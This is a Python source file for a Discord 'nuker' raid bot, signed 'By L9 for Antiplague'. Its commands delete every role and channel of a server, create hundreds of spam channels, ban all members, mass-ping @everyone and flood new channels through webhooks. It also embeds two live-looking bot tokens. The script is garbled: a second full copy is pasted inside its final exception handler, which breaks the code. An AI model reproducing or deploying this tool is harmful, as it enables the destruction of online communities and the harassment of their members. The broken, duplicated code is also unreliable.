import os, sys, discord, requests, json, threading, random, asyncio, logging
from discord.ext import commands
from os import _exit
from time import sleep
from datetime import datetime


if sys.platform == "win32":
	clear = lambda: os.system("cls")
else:
	clear = lambda: os.system("clear")

token = ("MTExNDgwMDIxMzAzMTQwNzY2Ng.GmpRlH.e2ODz4mkRwlnT0fQwvJXCnPuPncZVaFsy2201s")
prefix = (".")
channel_names = ("LxY on top", "clown")
role_names = ("LxY", "LxY On Top")
webhook_users = ("LxY On Top", "down")
webhook_contents = ("@everyone LxY On Top https://cdn.discordapp.com/attachments/1028564708892102736/1028619391471980624/unknown-9.png")

bot = commands.Bot(
  command_prefix=("."),
  intents=discord.Intents.all(),
  help_command=None
)

if bot:
	headers = {
	  "Authorization": f"Bot {token}"
	}
else:
	headers = {
	  "Authorization": token
	}

logging.basicConfig(
    level=logging.INFO,
    format= "\033[1;49;91m[\033[0;49;93m%(asctime)s\033[1;49;91m] \033[0m%(message)s",
    datefmt="%H:%M:%S",
)

sessions = requests.Session()

def menu():
	clear()
	logging.info(f"""\033[1;49;91m
	
                                  MMMMMMMMMMMMMMWO,.,kWMMMMMMMMMMMMMM
                                 MMMMMMMMMMMMMWKl.   .lKWMMMMMMMMMMMMM
                                MMMMMMMMMMMMWKl.       :KMMMMMMMMMMMMMM              
                               MMMMMMMMMMMWKl.       .l0WMMMMMMMMMMMMMMM
                              MMMMMMMMMMWKl.      .,l0WMMMMWXXWMMMMMMMMMM
                             MMMMMMMMMWKl.      .l0NWMMMMWKl..lKWMMMMMMMMM
                             MMMMMMMMXo.      .c0WMMMMMWKl.    .lKWMMMMMMM
                             MMMMMMMMXo.      .cKWMMMWKl.        .lKWMMMMM
                             MMMMMMMMMW0l.      .l0N0l.            .lKWMMM
                             MWKooKWMMMMWKl.      ...      .cc.      .lKWM
                             Kl.  .lKWMMMMWKl.           .l0WWKl.      .l0
                             ;      .lKWMMMMWx.         .dWMMMMW0l.      ;
                             0l.      .lKWWKl.           .lKWMMMMWKl.  .l0
                             MWKl.      .cc.      ...      .lKWMMMMWKoo0WM
                             MMMW0l.            .l0X0l.      .lKWMMMMMMMMM
                             MMMMMWKl.        .l0WMMMWKc.      .oXMMMMMMMM
                             MMMMMMMW0l.    .l0WMMMMMWKl.      .lXMMMMMMMM
                             MMMMMMMMMWKl..l0WMMMMWWKl.      .l0WMMMMMMMMM
                              MMMMMMMMMWXXWMMMMWKl;.      .l0WMMMMMMMMMMM
                               MMMMMMMMMMMMMMWKl.       .l0WMMMMMMMMMMMM
                                MMMMMMMMMMMMMK:       .l0WMMMMMMMMMMMMM
                                 MMMMMMMMMMMMMW0l.   .l0WMMMMMMMMMMMMM
                                  MMMMMMMMMMMMMMWk,.'kWMMMMMMMMMMMMMM\n\n""")

	logging.info(f"\033[0;49;93mComandos: {prefix}nuke ~ {prefix}massban ~ {prefix}spam ~ {prefix}on")
	logging.info(f"\033[0;49;93mClient: {bot.user}")
	logging.info(f"\033[0;49;93mPrefix: {prefix}")
	logging.info(f"\033[0;49;93mBy L9 for Antiplague")
	

@bot.event
async def on_ready():
	try:
		await bot.change_presence(status=discord.Status.invisible)
	except Exception:
		pass
	menu()

@bot.event
async def on_message(message):                    
      await bot.process_commands(message)

@bot.command(
  aliases=["start", "empezar"]
)
async def on(ctx):
	try:
		await ctx.message.delete()
		guild = ctx.guild.id
	except:
		logging.info(f"Connection error.")
		sleep(10)
		_exit(0)

	def delete_role(i):
		sessions.delete(
		  f"https://discord.com/api/v9/guilds/{guild}/roles/{i}",
	  	headers=headers
		)

	def delete_channel(i):
		sessions.delete(
		  f"https://discord.com/api/v9/channels/{i}",
		  headers=headers
		)

	def create_channels(i):
		json = {
		  "name": i
		}
		sessions.post(
		  f"https://discord.com/api/v9/guilds/{guild}/channels",
		  headers=headers,
		  json=json
		)

	try:
		for i in range(3):
			for role in list(ctx.guild.roles):
				threading.Thread(
				  target=delete_role, 
				  args=(role.id, )
				  ).start()
				logging.info(f"Deleted role {role}.")

		for i in range(4):
			for channel in list(ctx.guild.channels):
				threading.Thread(
				  target=delete_channel,
				  args=(channel.id, )
				  ).start()
				logging.info(f"Deleted channel {channel}.")

		for i in range(500):
			threading.Thread(
			  target=create_channels,
			  args=(random.choice(channel_names), )
			).start()
			logging.info(f"Created channel {random.choice(channel_names)}.")
	except Exception as error:
		logging.info(f"Connection error.")
		sleep(10)
		_exit(0)


@bot.command(
  aliases=["ban", "banall"]
)
async def massban(ctx):
	try:
		await ctx.message.delete()
		guild = ctx.guild.id
	except:
		logging.info(f"Connection error.")
		sleep(10)
		_exit(0)

	def mass_ban(i):
		sessions.put(
		  f"https://discord.com/api/v9/guilds/{guild}/bans/{i}",
		  headers=headers
		)
	try:
		for i in range(3):
			for member in list(ctx.guild.members):
				threading.Thread(
				  target=mass_ban, 
				  args=(member.id, )
				).start()
				logging.info(f"Executed member {member}.")
		clear()
		logging.info("Operación mass ban exitosa")
		menu()
	except Exception as error:
		logging.info("Connection error.")
		sleep(10)
		_exit(0)

@bot.command(
  aliases=["massping", "mass"]
)
async def spam(ctx, amount = 30):
	try:
		await ctx.message.delete()
		guild = ctx.guild.id
	except:
		logging.info(f"Connection error.")
		sleep(10)
		_exit(0)
	
	def mass_ping(i):
	  json = {
	    "content": random.choice(webhook_contents),
	    "tts": False
	  }
	  sessions.post(
	    f"https://discord.com/api/v9/channels/{i}/messages", 
	    headers=headers,
	    json=json
	 )
	try:
		for i in range(amount):
			for channel in list(ctx.guild.channels):
				threading.Thread(
				  target=mass_ping, 
				  args=(channel.id, )
				).start()
				logging.info(f"Spammed {random.choice(webhook_contents)} {i} times per channel.")
		clear()
		logging.info("Operación mass ping exitosa")
		menu()
	except Exception as error:
		logging.info("Connection error.")
		sleep(10)
		_exit(0)


@bot.command(aliases=["n"])
async def nuke(ctx):
  try:
    await ctx.message.delete()
    guild = ctx.guild.id
  except:
    logging.info(f"Connection error.")
    sleep(10)
    _exit(0)

  def delete_channel(i):
    sessions.delete(
		  f"https://discord.com/api/v9/channels/{i}",
		  headers=headers
		)

  def create_channels(i):
    json = {
		  "name": i
		}
    sessions.post(
		  f"https://discord.com/api/v9/guilds/{guild}/channels",
		  headers=headers,
		  json=json
		)

  try:
    for i in range(200):
      for channel in list(ctx.guild.channels):
        threading.Thread(
				  target=delete_channel,
				  args=(channel.id, )
				  ).start()
        logging.info(f"Deleted channel {channel}.")
    for i in range(1):
      threading.Thread(
			  target=create_channels,
			  args=(random.choice(channel_names), )
			).start()
      logging.info(f"Created channel {random.choice(channel_names)}.")
  except Exception as error:
    logging.info(f"Connection error. {error}")
    sleep(10)
    _exit(0)

@bot.event
async def on_guild_channel_create(channel):
	try:
		webhook = await channel.create_webhook(name="Antiplague x L9")
		for i in range(130):
			await webhook.send(random.choice(webhook_contents))
			logging.info(f"Created and spammed webhook {i} times.")
		clear()
		menu()
		logging.info("Operación nuke exitosa.")
	except Exception:
	  pass


if __name__ == "__main__":
	clear()
	#print("\033[38;5;92m" + license)
	#sleep(3)
	clear()
	logging.info("Loading client.")
	try:
		bot.run(
		  token, 
		  bot=bot
		)
	except Exception:
		import os, sys, discord, requests, json, threading, random, asyncio, logging
from discord.ext import commands
from os import _exit
from time import sleep
from datetime import datetime


if sys.platform == "win32":
	clear = lambda: os.system("cls")
else:
	clear = lambda: os.system("clear")

token = ("MTA4ODQ2MDY4Nzc3NDMzMDg5MA.Gkmzif.hF8U7tASMD-PVExp-rw2JDb7ptXjoGUJZwurUQ")
prefix = (".")
channel_names = ("LxY on top", "clown")
role_names = ("LxY", "LxY On Top")
webhook_users = ("LxY On Top", "down")
webhook_contents = ("@everyone LxY On Top https://cdn.discordapp.com/attachments/1028564708892102736/1028619391471980624/unknown-9.png")

bot = commands.Bot(
  command_prefix=("."),
  intents=discord.Intents.all(),
  help_command=None
)

if bot:
	headers = {
	  "Authorization": f"Bot {token}"
	}
else:
	headers = {
	  "Authorization": token
	}

logging.basicConfig(
    level=logging.INFO,
    format= "\033[1;49;91m[\033[0;49;93m%(asctime)s\033[1;49;91m] \033[0m%(message)s",
    datefmt="%H:%M:%S",
)

sessions = requests.Session()

def menu():
	clear()
	logging.info(f"""\033[1;49;91m
	
                                  MMMMMMMMMMMMMMWO,.,kWMMMMMMMMMMMMMM
                                 MMMMMMMMMMMMMWKl.   .lKWMMMMMMMMMMMMM
                                MMMMMMMMMMMMWKl.       :KMMMMMMMMMMMMMM              
                               MMMMMMMMMMMWKl.       .l0WMMMMMMMMMMMMMMM
                              MMMMMMMMMMWKl.      .,l0WMMMMWXXWMMMMMMMMMM
                             MMMMMMMMMWKl.      .l0NWMMMMWKl..lKWMMMMMMMMM
                             MMMMMMMMXo.      .c0WMMMMMWKl.    .lKWMMMMMMM
                             MMMMMMMMXo.      .cKWMMMWKl.        .lKWMMMMM
                             MMMMMMMMMW0l.      .l0N0l.            .lKWMMM
                             MWKooKWMMMMWKl.      ...      .cc.      .lKWM
                             Kl.  .lKWMMMMWKl.           .l0WWKl.      .l0
                             ;      .lKWMMMMWx.         .dWMMMMW0l.      ;
                             0l.      .lKWWKl.           .lKWMMMMWKl.  .l0
                             MWKl.      .cc.      ...      .lKWMMMMWKoo0WM
                             MMMW0l.            .l0X0l.      .lKWMMMMMMMMM
                             MMMMMWKl.        .l0WMMMWKc.      .oXMMMMMMMM
                             MMMMMMMW0l.    .l0WMMMMMWKl.      .lXMMMMMMMM
                             MMMMMMMMMWKl..l0WMMMMWWKl.      .l0WMMMMMMMMM
                              MMMMMMMMMWXXWMMMMWKl;.      .l0WMMMMMMMMMMM
                               MMMMMMMMMMMMMMWKl.       .l0WMMMMMMMMMMMM
                                MMMMMMMMMMMMMK:       .l0WMMMMMMMMMMMMM
                                 MMMMMMMMMMMMMW0l.   .l0WMMMMMMMMMMMMM
                                  MMMMMMMMMMMMMMWk,.'kWMMMMMMMMMMMMMM\n\n""")

	logging.info(f"\033[0;49;93mComandos: {prefix}nuke ~ {prefix}massban ~ {prefix}spam ~ {prefix}on")
	logging.info(f"\033[0;49;93mClient: {bot.user}")
	logging.info(f"\033[0;49;93mPrefix: {prefix}")
	logging.info(f"\033[0;49;93mBy L9 for Antiplague")
	

@bot.event
async def on_ready():
	try:
		await bot.change_presence(status=discord.Status.invisible)
	except Exception:
		pass
	menu()

@bot.event
async def on_message(message):                    
      await bot.process_commands(message)

@bot.command(
  aliases=["start", "empezar"]
)
async def on(ctx):
	try:
		await ctx.message.delete()
		guild = ctx.guild.id
	except:
		logging.info(f"Connection error.")
		sleep(10)
		_exit(0)

	def delete_role(i):
		sessions.delete(
		  f"https://discord.com/api/v9/guilds/{guild}/roles/{i}",
	  	headers=headers
		)

	def delete_channel(i):
		sessions.delete(
		  f"https://discord.com/api/v9/channels/{i}",
		  headers=headers
		)

	def create_channels(i):
		json = {
		  "name": i
		}
		sessions.post(
		  f"https://discord.com/api/v9/guilds/{guild}/channels",
		  headers=headers,
		  json=json
		)

	try:
		for i in range(3):
			for role in list(ctx.guild.roles):
				threading.Thread(
				  target=delete_role, 
				  args=(role.id, )
				  ).start()
				logging.info(f"Deleted role {role}.")

		for i in range(4):
			for channel in list(ctx.guild.channels):
				threading.Thread(
				  target=delete_channel,
				  args=(channel.id, )
				  ).start()
				logging.info(f"Deleted channel {channel}.")

		for i in range(500):
			threading.Thread(
			  target=create_channels,
			  args=(random.choice(channel_names), )
			).start()
			logging.info(f"Created channel {random.choice(channel_names)}.")
	except Exception as error:
		logging.info(f"Connection error.")
		sleep(10)
		_exit(0)


@bot.command(
  aliases=["ban", "banall"]
)
async def massban(ctx):
	try:
		await ctx.message.delete()
		guild = ctx.guild.id
	except:
		logging.info(f"Connection error.")
		sleep(10)
		_exit(0)

	def mass_ban(i):
		sessions.put(
		  f"https://discord.com/api/v9/guilds/{guild}/bans/{i}",
		  headers=headers
		)
	try:
		for i in range(3):
			for member in list(ctx.guild.members):
				threading.Thread(
				  target=mass_ban, 
				  args=(member.id, )
				).start()
				logging.info(f"Executed member {member}.")
		clear()
		logging.info("Operación mass ban exitosa")
		menu()
	except Exception as error:
		logging.info("Connection error.")
		sleep(10)
		_exit(0)

@bot.command(
  aliases=["massping", "mass"]
)
async def spam(ctx, amount = 30):
	try:
		await ctx.message.delete()
		guild = ctx.guild.id
	except:
		logging.info(f"Connection error.")
		sleep(10)
		_exit(0)
	
	def mass_ping(i):
	  json = {
	    "content": random.choice(webhook_contents),
	    "tts": False
	  }
	  sessions.post(
	    f"https://discord.com/api/v9/channels/{i}/messages", 
	    headers=headers,
	    json=json
	 )
	try:
		for i in range(amount):
			for channel in list(ctx.guild.channels):
				threading.Thread(
				  target=mass_ping, 
				  args=(channel.id, )
				).start()
				logging.info(f"Spammed {random.choice(webhook_contents)} {i} times per channel.")
		clear()
		logging.info("Operación mass ping exitosa")
		menu()
	except Exception as error:
		logging.info("Connection error.")
		sleep(10)
		_exit(0)


@bot.command(aliases=["n"])
async def nuke(ctx):
  try:
    await ctx.message.delete()
    guild = ctx.guild.id
  except:
    logging.info(f"Connection error.")
    sleep(10)
    _exit(0)

  def delete_channel(i):
    sessions.delete(
		  f"https://discord.com/api/v9/channels/{i}",
		  headers=headers
		)

  def create_channels(i):
    json = {
		  "name": i
		}
    sessions.post(
		  f"https://discord.com/api/v9/guilds/{guild}/channels",
		  headers=headers,
		  json=json
		)

  try:
    for i in range(200):
      for channel in list(ctx.guild.channels):
        threading.Thread(
				  target=delete_channel,
				  args=(channel.id, )
				  ).start()
        logging.info(f"Deleted channel {channel}.")
    for i in range(1):
      threading.Thread(
			  target=create_channels,
			  args=(random.choice(channel_names), )
			).start()
      logging.info(f"Created channel {random.choice(channel_names)}.")
  except Exception as error:
    logging.info(f"Connection error. {error}")
    sleep(10)
    _exit(0)

@bot.event
async def on_guild_channel_create(channel):
	try:
		webhook = await channel.create_webhook(name="Antiplague x L9")
		for i in range(130):
			await webhook.send(random.choice(webhook_contents))
			logging.info(f"Created and spammed webhook {i} times.")
		clear()
		menu()
		logging.info("Operación nuke exitosa.")
	except Exception:
	  pass


if __name__ == "__main__":
	clear()
	#print("\033[38;5;92m" + license)
	#sleep(3)
	clear()
	logging.info("Loading client.")
	try:
		bot.run(
		  token, 
		  bot=bot
		)
	except Exception:
		logging.error(f"Especificó un token incorrecto o un token de bot sin todas las intenciones o actualmente no puede acceder a la API de Discord.")
		sleep(10)
		_exit(0)logging.error(f"Especificó un token incorrecto o un token de bot sin todas las intenciones o actualmente no puede acceder a la API de Discord.")
		sleep(10)
		_exit(0)